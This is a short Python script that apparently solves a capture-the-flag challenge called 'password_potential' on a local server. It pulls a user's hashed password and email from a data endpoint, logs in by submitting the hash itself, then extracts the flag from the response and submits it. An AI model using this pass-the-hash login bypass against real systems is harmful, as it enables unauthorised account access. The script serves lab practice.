import requests

cookies = {"user": "f812b4f6-550b-44f2-a656-8cb563a21c51"} # Cookie taken from the website under my user

response = requests.get("http://127.0.0.1:8000/games/password_potential/get_data", cookies=cookies)

data = response.json()

print(data)
payload = {
    "password": data["hashed_password"],
    "email": data["email"]
}

response = requests.post("http://127.0.0.1:8000/games/password_potential/login", cookies=cookies, data=payload)

print(response.text)

payload = {
    "flag": response.text.split(" ")[-1][:-1]
}

print(payload)
response = requests.post("http://127.0.0.1:8000/games/password_potential/verify", json=payload, cookies=cookies)

print(response.json())